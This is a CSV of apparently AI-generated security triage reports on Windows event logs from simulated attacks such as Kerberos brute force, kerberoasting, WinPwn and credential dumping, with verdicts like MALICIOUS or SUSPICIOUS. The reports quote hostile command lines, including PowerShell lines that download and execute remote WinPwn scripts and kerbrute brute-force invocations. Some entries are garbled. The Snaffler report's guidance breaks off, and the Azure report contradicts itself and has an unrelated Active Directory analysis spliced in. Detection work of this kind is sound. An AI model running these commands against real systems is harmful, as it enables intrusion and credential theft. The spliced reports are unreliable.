Directory Name,AI Response
Password Brute User using Kerbrute Tool,"Upon analyzing the provided Windows event logs, several indicators suggest potentially malicious activity:

1. **PowerShell Execution**: The logs indicate the execution of a PowerShell script that involves the use of ""kerbrute.exe bruteuser,"" which is typically used for brute force attacks against Kerberos. The command-line arguments suggest that it is attempting a brute force attack using a user list against a domain controller.

    - `powershell.exe & {... .\kerbrute.exe bruteuser --dc $ENV:userdnsdomain -d $ENV:userdomain $env:temp\bruteuser.txt TestUser1}`

2. **Sysmon Logs**: The Sysmon logs corroborate this activity showing that the PowerShell executable was indeed run, with the `kerbrute` execution pattern. This pattern is indicative of reconnaissance or a brute force attack. The presence of frequent conhost.exe invocations in close proximity also suggests parallel command execution associated with the PowerShell processes.

3. **User and Execution Context**: The user executing the script is ""SERVER002\admin_test,"" which implies that an administrative or elevated context may have been exploited to perform these actions.

4. **Security Logs**: While the security logs predominantly show standard user enumeration (Event ID 4798), the presence of elevated privileges (Event ID 4672) might be indicative of a privilege escalation attempt.

5. **Application Logs**: Despite Windows Defender being active and reporting its status as ""SECURITY_PRODUCT_STATE_ON,"" the potentially malicious scripts and executables did not trigger any alerts, which might suggest obfuscation techniques or gaps in real-time detection.

In summary, the execution of ""kerbrute.exe"" through PowerShell with arguments suggesting a brute force attack is a clear malicious indicator. The surrounding events and contexts confirm the suspicion of compromise, where an administrative user account is leveraged to execute this task.

Resolution: **MALICIOUS**

**Guidance on How to Proceed:**
1. Immediately isolate the affected host (Server002) from the network to prevent further propagation of malicious activity.
2. Conduct a forensic analysis on the host to assess the impact and scope of the compromise.
3. Reset credentials for accounts potentially exposed, especially ""admin_test,"" to counter unauthorized access.
4. Review and enhance security controls, including PowerShell execution policies and monitoring configurations.
5. Consider deploying endpoint detection and response (EDR) solutions to better detect and prevent such activities in the future."
WinPwn - PowerSharpPack - Kerberoasting Using Rubeus (2),"Upon reviewing the provided Windows event logs, several indicators suggest potentially malicious activity. Let me highlight the key findings:

1. **PowerShell Activity**:
   - There are multiple instances of PowerShell being called with a command script sourced from GitHub: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1`. This script is being executed to invoke Rubeus, a known tool for Kerberos ticket manipulation (kerberoasting). This is a strong indicator of post-exploitation activities aimed at credential theft.
   - The PowerShell command includes downloading and executing a remote script, which is generally a red flag in enterprise environments unless explicitly sanctioned processes.

2. **Process Execution and Anomalies**:
   - Frequent execution of tools like `wevtutil.exe`, `hostname.exe`, and `whoami.exe` is observed. While these can be legitimate admin activities, in conjunction with the suspicious PowerShell activity, they may be part of an attacker's reconnaissance phase to gather more information about the system environment and user context.
   - The `MicrosoftEdgeUpdate.exe` processes appear prominently, often executed with different command-line arguments. While Edge updates are normal, their frequent appearances here should be investigated contextually along with the other logging activities to rule out misuse.

3. **High-Integrity Context and User Privileges**: 
   - Several activities are executed under high or system integrity levels, indicating the execution with elevated privileges which could potentially facilitate an attack if performed by a non-admin user.

4. **Security and System Logs**:
   - The security logs show a large number of service executions that relate to maintaining system time services or security auditing without any critical or error indicators, but the PowerShell log's contents are the primary concern here.

**Conclusion and Guidance**:

The combination of downloading and executing known offensive security tools using PowerShell, persistent modifications and executions of the Microsoft Edge Update service, and reconnaissance actions like checking system information and events strongly suggests malicious activity.

**Resolution**: MALICIOUS - The logs contain activity indicative of credential harvesting and potential lateral movement employing a toolset associated with penetration testing or adversarial actors.

**Recommendations**:
- Immediately isolate the host (Server002) from the network to prevent further data exfiltration or lateral movement.
- Conduct a thorough forensic investigation: Check file system changes, network connections, and other logs for comprehensive understanding.
- Reset credentials for impacted and potentially impacted user accounts.
- Implement protective measures: Enhance monitoring, apply security patches, review group policies, and educate staff on recognizing phishing attempts or suspicious activities."
Extract all accounts in use as SPN using setspn,"Upon analyzing the provided Windows event logs, I observed the following:

1. **Processes Execution:**
   - Various processes such as `powershell.exe`, `wevtutil.exe`, `svchost.exe`, and `cmd.exe` are executed by the user `SERVER002\\admin_test`.

2. **Use of Tools and Commands:**
   - The use of `whoami.exe` and the command `cmd.exe /c setspn -T %%USERDNSDOMAIN%% -Q */*` indicates activity related to querying Service Principal Names (SPNs). `setspn` is not commonly used in normal user activity and might indicate reconnaissance for privilege escalation or lateral movement within a network.

3. **Frequent Use of `wevtutil.exe`:**
   - The tool `wevtutil.exe` is executed multiple times. This tool is typically used for managing the Windows Event Log. Multiple executions in a short span could indicate tampering with logs or an attempt to clear or modify event logs, which can be suspicious.

4. **Scheduled Task and Time Change:**
   - There are multiple system time changes triggered by `svchost.exe`, generally scheduled time service tasks, which can be benign unless in sequence with other suspicious activities.

5. **Microsoft Edge Update Activity:**
   - There are numerous logs associated with Microsoft Edge Update processes. This seems to be routine background activity where Edge is being updated.

6. **Privileges:**
   - The processes are generally running with high or system integrity levels, which indicates they have elevated privileges. Consistently high-integrity processes executed by a regular user account (even with admin-like privileges) should be scrutinized.

### Assessment:
- **Suspicious Activities Identified:**
  - The execution of `cmd.exe` with the `setspn` command and frequent use of `wevtutil.exe` without corresponding expected administrative actions raises a flag of suspicion, possibly pointing to reconnaissance actions or preparation for privilege escalation.

### Resolution:
Based on the activity noted and its context, we categorize this situation as **SUSPICIOUS**. 

### Guidance:
- **Further Investigation:**
  - Investigate the purpose and context of `setspn` usage. Determine if it's aligned with legitimate administrative tasks or if it corresponds to unauthorized reconnaissance activity.
  - Examine the actions around `wevtutil.exe` to understand if logs were reviewed, cleared, or altered.
  - Verify the legitimacy of the `SERVER002\\admin_test` user's actions and ensure that the actions align with expected administrative duties.
  - Conduct network and host-level checks to identify any further anomalies associated with this user or host, particularly noting any privilege changes or access patterns.

- **Enhance Monitoring:**
  - Implement monitoring for such command usages, especially `setspn` and `wevtutil`, and alert on anomalous behavior.
  - Review and improve detection rules for similar activities to catch potential malicious behaviors early.
  
This investigation should continue to confirm or dismiss any potential threat from these activities."
WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,"Upon analyzing the provided Windows event logs, several points of interest emerge, highlighting potentially suspicious activities:

1. **Use of PowerShell with Suspicious Script**:
   - A PowerShell command is executed with a command-line that downloads and executes a script from `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`. This script is related to WinPwn, a tool often used for penetration testing or exploitation. The use of `iex(new-object net.webclient).downloadstring(...)` is particularly noteworthy as it indicates execution of potentially malicious code downloaded from the internet.
   
2. **Time Manipulation**:
   - There are events indicating changes to the system time. This is seen with security Event IDs 4616 and the associated Kernel-General events. Changing system time can be used by attackers to manipulate event logs, potentially to cover tracks.

3. **Execution of Wevtutil and Elevated Privileges**:
   - Wevtutil is a command-line utility that can be used to query or manipulate event logs. Its repeated execution, especially if not typical for the user or systems operations, could suggest attempts to evade detection by clearing logs.
   - Security Event ID 4672 logs privilege assignments involving sensitive rights such as `SeDebugPrivilege`, `SeBackupPrivilege`, and others, which are often targeted during privilege escalation attacks.

4. **Frequent Execution of System Utilities**:
   - The regular execution of utilities like `hostname.exe`, `whoami.exe`, and `conhost.exe` is typical; however, in the context of simultaneous unusual script activity and time changing, they could serve as components within a larger, concealed operation.

### Threat Assessment:
- **Malicious Use of PowerShell**: The download and execution of scripts from an external source confirm risky behavior that could indicate compromise or ongoing exploitation attempts.
- **Time Manipulation and Wevtutil Usage**: These activities are consistent with actions seen during attempts to obfuscate or clean evidence of malicious activities.

### Guidance for Next Steps:
1. **Immediate Network Isolation**: To prevent further spread or communication with external malicious sources, isolate the system from the network.
2. **Conduct Comprehensive Malware Analysis**: Examine the downloaded script and analyze its behavior. Use sandbox environments to determine its impact.
3. **Log Analysis and Restoration**: Review and potentially restore event logs if feasible. Conduct a more extensive review to identify other deviations.
4. **Enhanced Monitoring**: Ensure heightened monitoring on other systems for similar activities or anomalies.
5. **Password Changes and Privilege Review**: Consider a forced change of passwords and review of user account privileges on the system to limit further exploitation.

Based on the identified behaviors and the presence of malicious scripting activity, the conclusion is:

**Resolution: MALICIOUS** - The logs contain clear indicators of malicious activity, confirming a compromise or active security threat."
WinPwn - Snaffler,"### Analysis of the Logs:

Upon reviewing the provided Windows event logs, I have identified several events and activities that point towards potentially malicious behavior. Here are the highlights of my analysis:

1. **Suspicious PowerShell Activity:**
   - **Sysmon Event ID 1:** The execution of a PowerShell command with the following command line: 
     ```
     ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), Snaffler -noninteractive -consoleoutput}
     ```
     This command line indicates the download and execution of a script from a remote repository without user interaction, which is a known technique for executing malicious scripts.

   - **PowerShell Logs:** Corroborating the Sysmon entry, multiple PowerShell logs indicate the same suspicious activity associated with the command above, confirming its execution on the system.

2. **Privilege Usage:**
   - **Security Logs Event ID 4672:** Multiple privilege escalation logs indicate that the `SERVER002\admin_test` account was using elevated privileges including `SeDebugPrivilege`, `SeSecurityPrivilege`, and others. This suggests the possibility of lateral movement or privilege escalation tactics being employed.

3. **Time Manipulation:**
   - **System and Security Event ID 4616 and Kernel-General 1:** There is evidence of time changes on the system which could potentially be used to evade log timelines and detection by altering timestamps.

4. **Presence of System Files:**
   - **Sysmon Events:** Reference to common system utilities like `whoami.exe`, `conhost.exe`, and `hostname.exe`. While not inherently suspicious, the execution of multiple system utilities in a sequence can be indicative of reconnaissance activity by an attacker.

5. **Edge Update Activity:**
   - A flurry of Microsoft Edge Update activities and processes was noted, but these appear normal and consistent with system update activities. 

### Assessment and Recommendation:

The events captured in these logs, particularly the execution of the PowerShell script from an external source, indicate an unauthorized script execution which is a classic sign of malicious behavior. The elevated privileges and time manipulation further support the likelihood of compromise.

### Resolution:
**MALICIOUS** - Based on the identified script execution and privilege escalation, it is highly likely that these logs indicate malicious activity. Immediate action is recommended. 

### Guidance:

1. **Immediate Containment:**

   - Educate employees about safe IT practices and scripts execution risks.

By following these recommendations, the organization can mitigate the threat and prevent future incidents."
Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config),"**Detailed Analysis of Windows Event Logs:**

**PowerShell Log Analysis:**

The PowerShell event log entries show the execution of the command `powershell.exe & {C:\\Windows\\System32\\inetsrv\\appcmd.exe list apppool /config}`. This command seems to be listing the configuration of application pools on an IIS server. While PowerShell activity can be indicative of malicious behavior, in this context, the command itself seems benign and related to normal administrative tasks — specifically, querying IIS configurations.

**Sysmon Log Analysis:**

1. **Microsoft Edge Update and Installation:** There are entries related to the installation/updates of Microsoft Edge (`MicrosoftEdge_X64_130.0.2849.46_129.0.2792.89.exe` and `setup.exe`). These processes are executed by `NT AUTHORITY\SYSTEM`, which is expected for system-level updates. The use of Microsoft’s official update paths and the description being consistent with legitimate Microsoft products indicates benign behavior.

2. **PowerShell and Conhost Processes:** The PowerShell entries mention activity logged under the user `SERVER002\admin_test`, consistent with administrative tasks. PowerShell was invoked with a command related to IIS, which matches the observed PowerShell log events. There is accompanying conhost.exe activity, which is typical when a command prompt or PowerShell window is open.

3. **Use of Built-in Administrative Tools:**
   - `wevtutil.exe` is logged under the user `SERVER002\admin_test`. This tool is used to manage event logs and subscriptions, which is common in administrative tasks.
   - `whoami.exe` was executed, which is a legitimate command that provides information about the user.

4. **Process Integrity Levels and User Context:** All these processes are executed under the user `SERVER002\admin_test` with `High` integrity level, which indicates administrative privileges. This context is consistent for a user executing system maintenance or diagnostic tasks.

**Assessment:**

The logs reflect predominantly administrative activities:
- The PowerShell command interacting with IIS configurations is legitimate in an environment managing web servers.
- Processes related to Microsoft Edge updates are typical behavior in maintaining system updates.
- Use of administrative tools like `wevtutil.exe` and `whoami.exe` in a consistent user and integrity context suggests these actions may be planned maintenance or diagnosis.

**Resolution: BENIGN**

**Conclusion and Guidance:**

The provided logs indicate routine administrative tasks related to IIS configuration verification, Windows event log management, and system updates. There are no explicit indicators of malware or compromise. For due diligence:
- Verify with server administrators if the user `admin_test` was scheduled to perform routine checks on the IIS server and update Microsoft Edge.
- Maintain regular audits and log reviews to ensure this activity remains consistent with planned administrative tasks.

Given the benign nature of the current findings, there is no need for immediate action beyond routine monitoring."
Simulating access to Chrome Login Data,"**Detailed Analysis:**

1. **PowerShell Logs:**
   - The PowerShell logs display the use of the `Copy-Item` command to copy Chrome browser login data files (from the paths ""Google\\Chrome\\User Data\\Default\\Login Data"" and ""Login Data For Account"") to an external directory (""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles"").
   - This operation is suspicious as it involves accessing and copying sensitive data (Chrome's login information) which may be indicative of an attempt to gather stored credentials.

2. **Sysmon Logs:**
   - Several logs highlight the execution of `powershell.exe` by the user ""SERVER002\\admin_test"" with a high integrity level. These executions align with the suspicious behavior noted in the PowerShell logs.
   - Processes such as `conhost.exe` and `wevtutil.exe` are executed multiple times, which may be legitimate but warrant correlation with other activities to assess the intent of their execution.
   - The `whoami.exe` and `hostname.exe` executions do not show obvious signs of malicious behavior in isolation. However, when analyzed in conjunction with the PowerShell activity, they might have been used for system enumeration and data gathering which could be preparatory steps for an attack.

3. **Security Logs:**
   - The logs reflect typical system behavior such as the SYSTEM account activities which are not unusual.
   - However, there is no explicit evidence of privilege escalation here, but privilege escalation may have occurred in conjunction with the suspicious use of PowerShell.

4. **Application Logs:**
   - These logs do not show any explicit malicious activity or errors related to the suspicious activities noted.

**Assessment:**

- **Suspicious Behavior Identified:** The copying of Chrome login credentials using PowerShell, especially to a non-standard destination, is a significant indicator of suspicious behavior. This action could potentially be part of a credential harvesting operation.
- **Potential Risk:** Unauthorized access to sensitive credentials and possible data exfiltration.
- **Resolution: SUSPICIOUS**

**Guidance:**
- Investigate the intention behind the PowerShell command execution, particularly who initiated it and why the login data was being copied.
- Review user activity for ""SERVER002\\admin_test"" to determine if these activities align with authorized tasks.
- Check the destination folder for other files or evidence of further data exfiltration attempts.
- Consider temporarily disabling the user account ""admin_test"" and changing passwords for Chrome accounts if this was not an authorized activity.
- Monitor for additional signs of data access or exfiltration and enhance logging of PowerShell actions to potentially capture scripting activities earlier."
Create Volume Shadow Copy with vssadmin,"**Analysis of the Logs:**

**Security Log:**
- Event ID 5379 consistently appears with failed credential read operations. This indicates potential issues with accessing or retrieving credentials, which might point to attempts to gather credential information. However, these failures could also result from misconfiguration or expected application behavior.

**Application Log:**
- The entry from SecurityCenter indicates Windows Defender is enabled and operational, which is a positive sign regarding antivirus protection on the system.

**System Log:**
- Windows Update logs show security intelligence updates for Microsoft Defender, which indicates the system is receiving relevant security updates timely, contributing to maintaining a secure state.

**Sysmon Log:**
- Several instances of command lines involving cmd.exe, reg.exe, and findstr.exe are indicative of command-line operations typically associated with administrative tasks or system diagnostics. The command involving checking registry keys (`reg query`) and string search (`findstr LanmanNT`) appears to be querying the system's product type.
- A process chain involving `cmd.exe` and `vssadmin.exe` for creating a shadow copy is noted. While shadow copies are legitimate operations, frequent or unexpected invocations may be associated with preparations for malicious activities, such as ransomware attacks. However, this alone doesn't confirm malicious intent without additional context.
- There are numerous Sysmon Event ID 5 processes indicating execution of system and utility processes, which is expected in regular administrative or system operations.
- Processes related to system updates or security (e.g., antivirus updates) appear as expected operations.

**Behavior Assessment:**

1. **Failed Credential Reads:** These might indicate probing for access or credential stuffing attempts but don't conclusively indicate a compromise from these logs alone.
2. **Shadow Copy Command:** The use of `vssadmin.exe` is a common tactic in certain malware strategies like ransomware but could also be part of legitimate backup procedures.
3. **Command-Line Operations:** Operations seen here are consistent with system security checks or diagnostic tasks.

**Conclusion:**

- The logs provide multiple signs of potential reconnaissance or preparation activities, such as failed credential reads and execution of `vssadmin.exe`. While these actions could be part of legitimate administrative tasks, the combination, particularly the shadow copy creation, could indicate suspicious behavior.
  
**Resolution: SUSPICIOUS**

**Guidance:**
- Recommend a deeper investigation into the context of the command line and shadow copy operations. Anomalous behavior, like the unusual use of `vssadmin.exe`, should be correlated with user activity and access logs.
- Examine whether these activities coincide with known benign scripts or processes. If the context of these actions remains unclear, conduct a thorough security assessment of the system, and review network connections for any data exfiltration attempts.
- Monitor this host for further suspicious activities and potentially apply a higher level of access control or auditing to critical actions like shadow copy creation."
Copy NTDS.dit from Volume Shadow Copy,"Upon analyzing the provided event logs, there are several points of interest and red flags that indicate potential malicious activity:

1. **Suspicious Command Execution:** 
   - There is evidence of PowerShell usage to attempt volume shadow copy manipulation (`Sysmon EventID: 1`). This typically involves using commands like `vssadmin`, which can be indicative of an attempt to access or delete shadow copies potentially as part of data exfiltration or preparation for ransomware activities.
   - The `cmd.exe` process was used with specific arguments to work with volume shadow copies and registry hive files, suggesting an attempt to copy sensitive system files such as `NTDS.dit` and `SYSTEM` hives. This is often a goal for attackers looking to perform credential dumping or registry analysis.
   - Multiple instances of `wevtutil.exe` being invoked to extract event logs. Attackers commonly use this technique to review audit trails or evade detection by tampering with logs.

2. **Privilege Escalation:**
   - The use of the `SYSTEM` account to execute tasks signifies high privileges, which along with the processes executed with high integrity levels, points towards activities that require elevated permissions — a common necessity in sophisticated attacks.

3. **Logon Attempts with High Privileges:**
   - EventID 4672 shows privilege use with significant privileges such as `SeDebugPrivilege`, `SeTcbPrivilege`, and others critical for manipulating system processes or accessing sensitive resources.

4. **Time Manipulation Events:**
   - Log entries (EventID 4616) indicate attempts to alter system time, potentially to manipulate the timestamps of logs or other activities performed under scrutiny to evade detection mechanisms that rely on time-based analysis.

5. **Failed Credential Access:**
   - Several EventID 5379 entries show attempts to access credentials related to Microsoft accounts, all failing (`ReturnCode: 3221226021`). This could suggest brute force or credential stuffing attempts.

**Assessment:** Based on the aforementioned findings, the log entries portray a pattern of activity that suggests ongoing or attempted malicious operations involving credential access, privilege escalation, log manipulation, and system file access.

**Resolution: MALICIOUS** - The consistent patterns of suspicious command execution, high-level privilege usage, and manipulation of critical system components and processes strongly suggest a malicious operation. Immediate investigation and remediation actions are recommended, including:
- Conducting a full forensic investigation.
- Reviewing and strengthening access controls and permissions.
- Monitoring for further unauthorized activities.
- Updating and implementing endpoint detection and response solutions."
Dump LSASS.exe Memory using direct system calls and API unhooking,"Upon reviewing the provided Windows event logs, several entries stand out for their potential indicators of malicious activity. Let's analyze them:

1. **Security Log - Event ID 4624 & 4672:**
   - Event ID 4624 indicates a successful logon, particularly using Logon Type 5, which is used for service logons. This specific logon type is typically benign as it corresponds to system services.
   - Event ID 4672 indicates special privileges were granted. The privileges listed include sensitive rights like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and `SeLoadDriverPrivilege`. While services might request various rights, obtaining a broad range of privileges can be suspicious if not properly justified.

2. **Sysmon Log:**
   - There are frequent executions of `wevtutil.exe` and `conhost.exe` by the user `admin_test`. `wevtutil.exe` is used for managing event logs, while `conhost.exe` is a console window host process. The high frequency and context (separate processes starting closely in time) can suggest log tampering or another form of activity that attempts to cover tracks or is part of a larger pivot.
   - More concerning is the execution of `cmd.exe` with a command line involving `Outflank-Dumpert.exe`, a known tool used for credential dumping. This indicates an attempt to extract sensitive information such as passwords, which is clearly malicious behavior.
   - The command `wevtutil.exe epl Microsoft-Windows-Sysmon/Operational C:\Users\ADMIN_~1\AppData\Local\Temp\TempLog.evtx` suggests an attempt to export Sysmon logs. While benign in specific administrative scenarios, in conjunction with other suspicious activities, it could suggest log manipulation or data exfiltration efforts.

3. **General Observations:**
   - The use of known administrative tools and utilities (`whoami.exe`, `hostname.exe`, `wevtutil.exe`) in close temporal proximity can indicate reconnaissance activities.
   - The execution paths, particularly within `Temp` directories, and direct execution of command-line calls match patterns commonly used in attacks for evasion and to engage in lateral movement within a network.

**Assessment:**
Given the execution of `Outflank-Dumpert.exe`, which is a known credential harvesting tool, along with the other potentially evasive activities observed (log exports, frequent execution of basic Windows utilities, special privileges escalation), there is enough evidence to suggest the presence of malicious activity.

**Resolution: MALICIOUS**

**Guidance:**
1. Immediately isolate the affected host (Server002) to prevent further lateral movement or data extraction.
2. Conduct a full disk forensic analysis to identify any additional signs of compromise.
3. Review logs and system configurations for other entries and settings that might indicate additional or companion compromises.
4. Assess accounts and privileges on the system to ensure that no unauthorized access continues.
5. Consider implementing enhanced monitoring and threat detection solutions to prevent future occurrences."
Gsecdump,"Upon analyzing the provided Windows event logs, the following observations and assessments were made regarding potential malicious activities:

**Observations of Suspicious or Anomalous Behavior:**

1. **Frequent Execution of Wevtutil:**
   - The logs reveal multiple instances of ""wevtutil.exe"" being executed. This is a Windows command-line utility that leverages the Windows Event Log service to manage event log files and metadata. Continuous execution may be legitimate maintenance, but it may also indicate attempts to tamper with log files, such as clearing event logs to cover tracks.

2. **PowerShell Execution:**
   - ""powershell.exe"" is executed as observed from the logs. PowerShell is a powerful scripting language on Windows, often used by attackers for malicious scripts such as downloading payloads, executing commands, or fileless malware. No specific command-line arguments are shown, which doesn't immediately suggest typical malicious behavior, but it warrants further inspection given the context.

3. **Execution of gsecdump:**
   - A critical alert in the logs is the execution of “gsecdump.exe” through ""cmd.exe"". Gsecdump is typically used for dumping credentials from the operating system, which is a significant indicator of credential theft attempts. This activity is highly alarming and is generally considered a nefarious action as it attempts unauthorized credential recovery.

4. **High Integrity Level Operations:**
   - Several processes, like cmd.exe, whoami.exe, etc., are running at a high integrity level, which means these processes have administrative privileges. The context under which these are run should be examined, especially in environments where users should not have administrative access.

5. **Exploitation Indicators:**
   - The sequence of executed commands and the rapid succession of these activities suggest automated scripts or penetration testing frameworks may be executing these tasks. The presence of command execution tools frequently used in post-exploitation (e.g., gsecdump) aligns with known exploitation tactics.

6. **Security Audit Events:**
   - Event ID 5379 shows attempts to read credential-related operations, returning a failed operation code, which might indicate unauthorized or anomalous access attempts on accounts configured on the machine.

**Assessment of Malicious Activity:**

Based on the above evidence, particularly the execution of gsecdump, this host shows strong indicators of compromise and malicious activity. The detected activities align with typical behaviors associated with malware execution, unauthorized access attempts, and potential credential dumping activities.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Network Segmentation:**
   - Isolate the affected host from the network to prevent any potential lateral movement by attackers and to mitigate further data exfiltration or impact.

2. **Memory and Disk Image Capture:**
   - Capture memory and disk images for a comprehensive forensic investigation to uncover additional indicators of compromise.

3. **Credential Reset:**
   - Initiate a credential reset for all impacted users, particularly focusing on any admin accounts that are seen in these logs.

4. **Conduct Thorough Malware and Threat Detection Scans:**
   - Utilize well-updated antivirus and anti-malware tools to scan not only the affected host but also the network for similar footprints or the presence of other compromised systems.

5. **Review and Enhance Security Controls:**
   - Implement tighter control systems for PowerShell, restrict unnecessary execution of command-line tools, and enhance logging and monitoring across all critical systems.

6. **Incident Response Plan Activation:**
   - Engage an incident response team to handle this situation and assess any further risk to enterprise systems.

The outlined actions should collectively help in thorough investigation and remediation of this malicious activity."
Brute Force Credentials of single Active Directory domain users via SMB,"Based on the analysis of the logs provided, I have identified some activities that could be indicative of potentially suspicious or malicious behavior. Let me detail the findings:

1. **Time Manipulation**: 
   - In the system log, we see back-to-back events indicating adjustments to the system time (`EventID"":""1""`), especially with slightly altered times within seconds (`NewTime` and `OldTime`). This could be benign, as time sync issues occur often in server environments; however, deliberate time changes can also be a technique used by attackers to manipulate timestamps for their activities.

2. **Admin Privileges and NTLM Logon**:
   - In the security log, multiple logon events for the user `admin_test` using NTLM are observed, associated with privileges like `SeDebugPrivilege`. While these privileges are normal for administrative accounts, it is unusual to see a series of logons and privilege escalations in quick succession (`EventID"":""4672""` and `EventID"":""4624""`). This needs further scrutiny, especially the IP address `192.168.0.102` from which the logon originated.

3. **Unusual Command Execution**:
   - In the Sysmon logs, a command was executed using `cmd.exe` to echo potential passwords into a file (`passwords.txt`) and loop through them using `net use` to authenticate attempts to the IPC$ share. This behavior is malicious as it resembles password spraying or cracking attempts using common passwords.

4. **Process Execution**:
   - Several instances of `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and `whoami.exe` executed in a sequence can be considered normal for administrative users managing system events or running diagnostics. However, the sequence of `cmd.exe` spawning the password check script highlights a higher risk.

5. **Software Updates (Microsoft Edge Update)**:
   - The logs include activities related to Microsoft Edge updates, including service stops and multiple executions of the update service in `SysMon`. These activities appear typical for legitimate software updates unless known vulnerabilities or trojans are being exploited through these updates.

**Assessment**:

Considering the above points, there is evidence of potentially harmful activity, particularly the creation and execution of a script to brute force IPC$ logins with various common passwords. This aligns with common malicious behaviors seeking unauthorized access via lateral movement.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- Immediately isolate the machine from the network to prevent further unauthorized access or data exfiltration.
- Conduct an in-depth forensic investigation on the affected host to trace back the origin and entry point of the activity.
- Review any related accounts, specifically `admin_test` and the IP `192.168.0.102`, to ensure no further compromises exist.

WinPwn - DomainPasswordSpray Attacks,"Based on the provided Windows event logs, a thorough analysis was performed. Here are the findings:

**Security Logs:**
- An Event ID 4616 is triggered twice and shows a time change event by the ""LOCAL SERVICE"", which is typical behavior as time synchronization tasks are performed by system services like Windows Time Service (`svchost.exe`). This, in itself, doesn't appear suspicious.

**Application Logs:**
- Logs from `SecurityCenter` indicate Windows Defender is in an active state, which is normal and expected behavior.

**Sysmon Logs:**
- There are multiple instances of process creation within a very short period. The processes include `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `PowerShell.exe`, all executed by the user `SERVER002\admin_test`. 
- The usage of `wevtutil.exe` and `conhost.exe` can be typical in legitimate activities, especially if the `admin_test` user is performing administrative tasks. However, the utilization and frequency could also suggest enumeration or script activity but provide limited evidence without further context.
- Notably, the execution of `powershell.exe` with a command line that includes downloading and executing a script directly from a GitHub URL raises an immediate red flag. The command:
  ```
  ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), domainpassspray -consoleoutput -noninteractive -emptypasswords}
  ```
  indicates an attempt to download and execute a potentially malicious script. This strongly suggests unauthorized and potentially harmful activity. 

**System Logs:**
- These logs mainly show time synchronization operations, which align with normal system behavior.

**Windows PowerShell Logs:**
- Logs show PowerShell being invoked to execute a script from the internet, which ties back to the Sysmon log and further confirms suspicious activity.

---

**Assessment:**

- The Sysmon and PowerShell logs clearly indicate potentially **malicious activity**. The execution of an external script through PowerShell, especially from an untrusted remote source, strongly implies that the system might be compromised or at risk. The mentioned GitHub script `WinPwn.ps1` is known for conducting post-exploitation tasks, including reconnaissance and privilege escalation.

**Resolution: MALICIOUS**

**Guidance:**
- Isolate the affected host immediately to prevent further potential network spread.
- Conduct a detailed forensic analysis of the system focusing on the timeline surrounding the execution of the PowerShell command.
- Identify any potential data exfiltration or unauthorized access attempts.
- Review user permissions and consider revoking or auditing the access of `admin_test`.
- Analyze additional network logs and traces to detect any other affected systems.
- Update all security patches and AV definitions on all systems.
- After remediation, conduct a comprehensive security awareness and training session for all administrative users stressing the importance of safe scripting practices."

Azure - Search Azure AD User Attributes for Passwords,"### Detailed Analysis

Based on the Windows PowerShell log and Sysmon logs provided, several potentially malicious behaviors are observed:

1. **Suspicious PowerShell Script Execution:**
   - The PowerShell event logs indicate the execution of a script involving commands to connect to `Connect-MsolService` using a secure string for password handling, and enumerate users with the `Get-MsolUser` cmdlet.
   - The script attempts to collect user properties that include ""password"" in their name and outputs these to a file named `data.005Test1.txt` in a temporary directory.
   - This behavior heavily suggests that the script is designed to gather sensitive information illicitly, a common pattern in credential theft attempts. 

2. **Process Execution Patterns:**
   - The Sysmon logs show multiple occurrences of `PowerShell.exe` invoked by the user `SERVER002\admin_test`, supporting the suspicious activities seen in the PowerShell log.
   - The processing of executables such as `wevtutil.exe`, and `whoami.exe` may be typical in certain scripts but can also be used in more nefarious activities. The combination of several processes during the same timeframe of executing the suspicious script further raises suspicion.
   - The logs indicate high integrity levels for the executed processes, which might suggest elevated privileges being utilized to execute these commands.

3. **Observed Anomalies:**
   - Execution of `PowerShell.exe` as found in the logs, especially with commands involving credential manipulation and mass user data access, is unusual and concerning.
   - The temporary directory output (`data.005Test1.txt`) appears to be the focus of the script's activity for storing potentially sensitive user information, which warrants investigation.

### Assessment

The gathered evidence strongly indicates attempts to execute Python scripts to potentially compromise sensitive user information. This aligns with intrusion tactics, potentially aimed at extracting credential-related data.

```
- **Suspicious Behavior**: The command uses PowerShell scripting to retrieve Active Directory replication account information, which could be considered an administrative task. However, in certain contexts, especially if run by unauthorized users, it can indicate reconnaissance activity within the environment.
- **Legitimate Use Case**: If performed by a systems administrator for legitimate maintenance or troubleshooting tasks, this might be considered benign.

### 2. Sysmon Logs

The Sysmon logs show:
- Multiple instances of `conhost.exe` and `wevtutil.exe` being executed by the same user (`SERVER002\admin_test`), in a pattern that suggests scripting activity.
- Execution of `HOSTNAME.EXE` and `WHOAMI.EXE` also indicates potential enumeration of the system and user contexts.
- PowerShell is used again with the same command, confirming the presence of scripting activity focused on AD-related tasks.

### 3. Security, System, and Application Logs

- Security logs are absent, which could potentially indicate their deletion or non-configuration for auditing specific events.
- The absence of System and Application logs provided limits insight into other potential system anomalies or errors.

### Assessment

Given the above findings:
- The use of PowerShell to query Active Directory and the pattern of process executions like `whoami.exe` and `hostname.exe` can be part of legitimate administrative activities or potential reconnaissance phase activity by an attacker.
- The repeated use by the same user and lack of additional logs, particularly security logs, makes it challenging to fully assess intent but raises concerns worth investigating.

### Resolution

**SUSPICIOUS**: The activity documented in the logs appears suspicious due to the nature of commands executed, the absence of expected audit logs, and the potential for misuse in a malicious context. Further investigation is required to determine the legitimacy of these activities.

### Recommended Actions

